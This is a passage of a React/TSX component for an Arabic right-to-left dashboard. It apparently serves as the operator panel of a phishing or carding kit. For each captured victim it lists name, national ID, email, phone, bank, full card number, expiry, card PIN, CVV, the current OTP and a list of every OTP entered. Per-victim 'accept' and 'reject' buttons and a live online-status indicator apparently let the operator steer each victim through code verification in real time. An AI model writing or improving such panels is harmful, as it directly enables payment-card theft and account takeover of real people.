                            <td className="px-4 py-3.5 text-center">
                              <FlagColorSelector
                                notificationId={notification.id}
                                currentColor={notification.flagColor || null}
                                onColorChange={handleFlagColorChange}
                              />
                            </td>
                            <td className="px-4 py-3.5 text-center">
                              <div className="flex justify-center gap-2">
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700 transition-colors duration-200 shadow-sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700 transition-colors duration-200 shadow-sm"
                                >
                                  رفض
                                </Button>
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="ghost"
                                        size="icon"
                                        onClick={() => handleDelete(notification.id)}
                                        className="h-8 w-8 text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-100 dark:hover:bg-red-900/30 transition-all duration-200"
                                      >
                                        <Trash2 className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent side="bottom" className="bg-card border-border shadow-md">
                                      <p>حذف الإشعار</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                          </tr>
                        ))}
                        {filteredNotifications.length === 0 && (
                          <tr>
                            <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                              لا توجد إشعارات متطابقة مع الفلتر المحدد
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>

                  {/* Mobile Card View for card tab */}
                  <div className="md:hidden space-y-4 p-4">
                    {filteredNotifications.length > 0 ? (
                      filteredNotifications.map((notification, index) => (
                        <Card
                          key={notification.id}
                          className={cn(
                            "overflow-hidden bg-card border-border shadow-md hover:shadow-lg transition-all duration-300 animate-in fade-in-50 slide-in-from-right-5",
                            getRowBackgroundColor(notification?.flagColor!),
                          )}
                          style={{ animationDelay: `${index * 50}ms` }}
                        >
                          <CardContent className="p-4">
                            {/* Same mobile card structure as in "all" tab */}
                            <div className="flex justify-between items-start mb-3">
                              <div>
                                <div className="font-semibold">{notification.country || "غير معروف"}</div>
                              </div>
                              <div className="flex items-center gap-2">
                                <FlagColorSelector
                                  notificationId={notification.id}
                                  currentColor={notification.flagColor || null}
                                  onColorChange={handleFlagColorChange}
                                />
                                <UserStatus userId={notification.id} />
                              </div>
                            </div>

                            <div className="grid grid-cols-1 gap-3 mb-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={cn(
                                    "rounded-md cursor-pointer transition-colors duration-200 shadow-sm",
                                    notification.cardNumber
                                      ? "bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700"
                                      : "hover:bg-muted",
                                  )}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>

                              <div className="text-sm flex items-center">
                                <span className="font-medium ml-2">رمز التحقق:</span>
                                {notification?.otp ? (
                                  <Badge
                                    variant="outline"
                                    className="bg-blue-100/80 text-blue-700 dark:bg-blue-900/60 dark:text-blue-300 border-0 shadow-sm animate-in fade-in-50 slide-in-from-bottom-3 duration-500"
                                    key={notification.otp}
                                  >
                                    {notification.otp}
                                  </Badge>
                                ) : (
                                  "-"
                                )}
                              </div>

                              <div className="text-sm flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="font-medium ml-2">الوقت:</span>{" "}
                                {notification.createdDate &&
                                  formatDistanceToNow(new Date(notification.createdDate), {
                                    addSuffix: true,
                                    locale: ar,
                                  })}
                              </div>

                              <div className="flex gap-2 mt-2">
                                <Button
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700 transition-colors duration-200 shadow-sm"
                                  size="sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1"
                                  variant="destructive"
                                  size="sm"
                                >
                                  رفض
                                </Button>
                                <Button
                                  variant="outline"
                                  onClick={() => handleDelete(notification.id)}
                                  className="w-10 p-0"
                                  size="sm"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </div>
                              {message && (
                                <p className="text-green-500 dark:text-green-400 text-center mt-2">تم الارسال</p>
                              )}
                            </div>
                          </CardContent>
                        </Card>
                      ))
                    ) : (
                      <div className="text-center py-8 text-muted-foreground">
                        لا توجد إشعارات متطابقة مع الفلتر المحدد
                      </div>
                    )}
                  </div>
                </ScrollArea>
              </TabsContent>

              <TabsContent value="online" className="m-0">
                <ScrollArea className="h-[calc(100vh-280px)] overflow-y-auto flex-1">
                  {/* Same structure as other tabs but with online filtered data */}
                  <div className="hidden md:block">
                    <table className="w-full border-collapse">
                      <thead>
                        <tr className="border-b border-border bg-muted/30 sticky top-0 z-10">
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">الدولة</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">المعلومات</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">OTP</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">الوقت</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">الحالة</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">العلم</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">الإجراءات</th>
                        </tr>
                      </thead>
                      <tbody>
                        {filteredNotifications.map((notification, index) => (
                          <tr
                            key={notification.id}
                            className={cn(
                              "border-b border-border hover:bg-muted/20 transition-all duration-300 animate-in fade-in-50 slide-in-from-right-5",
                              getRowBackgroundColor(notification?.flagColor!),
                            )}
                            style={{ animationDelay: `${index * 50}ms` }}
                          >
                            <td className="px-4 py-3.5 font-medium">{notification.country || "غير معروف"}</td>
                            <td className="px-4 py-3.5">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={cn(
                                    "rounded-md cursor-pointer transition-colors duration-200 shadow-sm",
                                    notification.cardNumber
                                      ? "bg-green-500 hover:bg-green-600 dark:bg-green-600 dark:hover:bg-green-700"
                                      : "hover:bg-muted",
                                  )}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>
                            </td>
                            <td className="px-4 py-3.5">
                              {notification?.otp ? (
                                <Badge
                                  variant="outline"
                                  className="bg-blue-100/80 text-blue-700 dark:bg-blue-900/60 dark:text-blue-300 border-0 shadow-sm animate-in fade-in-50 slide-in-from-bottom-3 duration-500"
                                  key={notification.otp}
                                >
                                  {notification.otp}
                                </Badge>
                              ) : (
                                "-"
                              )}
                            </td>
                            <td className="px-4 py-3.5 whitespace-nowrap">
                              <div className="flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="text-sm">
                                  {notification.createdDate &&
                                    formatDistanceToNow(new Date(notification.createdDate), {
                                      addSuffix: true,
                                      locale: ar,
                                    })}
                                </span>
                              </div>
                            </td>
                            <td className="px-4 py-3.5 text-center">
                              <UserStatus userId={notification.id} />
                            </td>
                            <td className="px-4 py-3.5 text-center">
                              <FlagColorSelector
                                notificationId={notification.id}
                                currentColor={notification.flagColor || null}
                                onColorChange={handleFlagColorChange}
                              />
                            </td>
                            <td className="px-4 py-3.5 text-center">
                              <div className="flex justify-center gap-2">
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700 transition-colors duration-200 shadow-sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700 transition-colors duration-200 shadow-sm"
                                >
                                  رفض
                                </Button>
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="ghost"
                                        size="icon"
                                        onClick={() => handleDelete(notification.id)}
                                        className="h-8 w-8 text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-100 dark:hover:bg-red-900/30 transition-all duration-200"
                                      >
                                        <Trash2 className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent side="bottom" className="bg-card border-border shadow-md">
                                      <p>حذف الإشعار</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                          </tr>
                        ))}
                        {filteredNotifications.length === 0 && (
                          <tr>
                            <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                              لا توجد إشعارات متطابقة مع الفلتر المحدد
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>

                  {/* Mobile Card View for online tab */}
                  <div className="md:hidden space-y-4 p-4">
                    {filteredNotifications.length > 0 ? (
                      filteredNotifications.map((notification, index) => (
                        <Card
                          key={notification.id}
                          className={cn(
                            "overflow-hidden bg-card border-border shadow-md hover:shadow-lg transition-all duration-300 animate-in fade-in-50 slide-in-from-right-5",
                            getRowBackgroundColor(notification?.flagColor!),
                          )}
                          style={{ animationDelay: `${index * 50}ms` }}
                        >
                          <CardContent className="p-4">
                            {/* Same mobile card structure as in other tabs */}
                            <div className="flex justify-between items-start mb-3">
                              <div>
                                <div className="font-semibold">{notification.country || "غير معروف"}</div>
                              </div>
                              <div className="flex items-center gap-2">
                                <FlagColorSelector
                                  notificationId={notification.id}
                                  currentColor={notification.flagColor || null}
                                  onColorChange={handleFlagColorChange}
                                />
                                <UserStatus userId={notification.id} />
                              </div>
                            </div>

                            <div className="grid grid-cols-1 gap-3 mb-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={cn(
                                    "rounded-md cursor-pointer transition-colors duration-200 shadow-sm",
                                    notification.cardNumber
                                      ? "bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700"
                                      : "hover:bg-muted",
                                  )}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>

                              <div className="text-sm flex items-center">
                                <span className="font-medium ml-2">رمز التحقق:</span>
                                {notification?.otp ? (
                                  <Badge
                                    variant="outline"
                                    className="bg-blue-100/80 text-blue-700 dark:bg-blue-900/60 dark:text-blue-300 border-0 shadow-sm animate-in fade-in-50 slide-in-from-bottom-3 duration-500"
                                    key={notification.otp}
                                  >
                                    {notification.otp}
                                  </Badge>
                                ) : (
                                  "-"
                                )}
                              </div>

                              <div className="text-sm flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="font-medium ml-2">الوقت:</span>{" "}
                                {notification.createdDate &&
                                  formatDistanceToNow(new Date(notification.createdDate), {
                                    addSuffix: true,
                                    locale: ar,
                                  })}
                              </div>

                              <div className="flex gap-2 mt-2">
                                <Button
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700 transition-colors duration-200 shadow-sm"
                                  size="sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1"
                                  variant="destructive"
                                  size="sm"
                                >
                                  رفض
                                </Button>
                                <Button
                                  variant="outline"
                                  onClick={() => handleDelete(notification.id)}
                                  className="w-10 p-0"
                                  size="sm"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </div>
                              {message && (
                                <p className="text-green-500 dark:text-green-400 text-center mt-2">تم الارسال</p>
                              )}
                            </div>
                          </CardContent>
                        </Card>
                      ))
                    ) : (
                      <div className="text-center py-8 text-muted-foreground">
                        لا توجد إشعارات متطابقة مع الفلتر المحدد
                      </div>
                    )}
                  </div>
                </ScrollArea>
              </TabsContent>
            </Tabs>
          </Card>
        </div>
      </div>

      {/* Dialog for showing notification details */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent
          className="bg-white text-foreground max-w-[90vw] md:max-w-md shadow-lg border-border animate-in fade-in-50 slide-in-from-bottom-10 duration-300"
          dir="rtl"
        >
          <DialogHeader className="pb-2">
            <DialogTitle className="flex items-center gap-2 text-lg font-bold">
              {selectedInfo === "personal" ? (
                <>
                  <div className="bg-primary/10 p-1.5 rounded-md">
                    <Info className="h-5 w-5 text-primary" />
                  </div>
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <div className="bg-primary/10 p-1.5 rounded-md">
                    <CreditCard className="h-5 w-5 text-primary" />
                  </div>
                  معلومات البطاقة
                </>
              ) : (
                "معلومات عامة"
              )}
            </DialogTitle>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
              {selectedNotification.idNumber && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">رقم الهوية:</span>
                  <span className="font-semibold">{selectedNotification.idNumber}</span>
                </p>
              )}
              {selectedNotification.email && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">البريد الإلكتروني:</span>
                  <span className="font-semibold">{selectedNotification.email}</span>
                </p>
              )}
              {selectedNotification.mobile && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">رقم الجوال:</span>
                  <span className="font-semibold">{selectedNotification.mobile}</span>
                </p>
              )}
              {selectedNotification.name && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">الاسم:</span>
                  <span className="font-semibold">{selectedNotification.name}</span>
                </p>
              )}
              {selectedNotification.phone && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">الهاتف:</span>
                  <span className="font-semibold">{selectedNotification.phone}</span>
                </p>
              )}
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
              {selectedNotification.bank && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">البنك:</span>
                  <span className="font-semibold">{selectedNotification.bank}</span>
                </p>
              )}
              {selectedNotification.cardNumber && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
                  <span className="font-semibold" dir="ltr">
                    {selectedNotification.prefix && (
                      <Badge
                        variant={"outline"}
                        className="bg-blue-100/80 dark:bg-blue-900/60 border-0 text-blue-700 dark:text-blue-300 mr-1 shadow-sm"
                      >
                        {selectedNotification.prefix && `${selectedNotification.prefix}`}
                      </Badge>
                    )}
                    <Badge
                      variant={"outline"}
                      className="bg-green-100/80 dark:bg-green-900/60 border-0 text-green-700 dark:text-green-300 shadow-sm"
                    >
                      {selectedNotification.cardNumber}
                    </Badge>
                  </span>
                </p>
              )}
              {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
                  <span className="font-semibold">
                    {selectedNotification.year && selectedNotification.month
                      ? `${selectedNotification.year}/${selectedNotification.month}`
                      : selectedNotification.cardExpiry}
                  </span>
                </p>
              )}
              {selectedNotification.pass && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">رمز البطاقة:</span>
                  <span className="font-semibold">{selectedNotification.pass}</span>
                </p>
              )}
              {(selectedNotification.otp || selectedNotification.otpCode) && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">رمز التحقق المرسل:</span>
                  <Badge className="font-semibold bg-green-600 text-white shadow-sm animate-pulse">
                    {selectedNotification.otp}
                    {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
                  </Badge>
                </p>
              )}
              {selectedNotification.cvv && (
                <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                  <span className="font-medium text-muted-foreground">رمز الامان:</span>
                  <span className="font-semibold">{selectedNotification.cvv}</span>
                </p>
              )}
              {selectedNotification.allOtps &&
                Array.isArray(selectedNotification.allOtps) &&
                selectedNotification.allOtps.length > 0 && (
                  <div className="py-1.5">
                    <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
                    <div className="flex flex-wrap gap-2">
                      {selectedNotification.allOtps.map((otp, index) => (
                        <Badge key={index} variant="outline" className="bg-muted shadow-sm">
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
